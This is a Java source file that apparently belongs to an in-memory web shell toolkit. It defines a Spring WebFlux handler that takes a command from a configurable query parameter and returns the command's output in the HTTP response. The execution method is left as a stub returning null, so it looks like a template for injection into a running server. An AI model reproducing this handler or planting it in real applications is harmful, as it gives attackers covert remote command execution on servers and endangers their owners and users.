package com.reajason.javaweb.memshell.shelltool.command;

import org.springframework.web.reactive.function.server.HandlerFunction;
import org.springframework.web.reactive.function.server.ServerRequest;
import org.springframework.web.reactive.function.server.ServerResponse;
import reactor.core.publisher.Mono;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Optional;

/**
 * @author ReaJason
 * @since 2024/12/25
 */
public class CommandHandlerFunction implements HandlerFunction<ServerResponse> {
    public static String paramName;

    @Override
    public Mono<ServerResponse> handle(ServerRequest request) {
        Optional<String> paramOptional = request.queryParam(paramName);
        if (!paramOptional.isPresent()) {
            return Mono.empty();
        }
        StringBuilder result = new StringBuilder();
        try {
            String param = getParam(paramOptional.get());
            InputStream inputStream = getInputStream(param);
            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) {
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    result.append(line);
                    result.append(System.lineSeparator());
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return ServerResponse.ok().body(Mono.just(result.toString()), String.class);
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
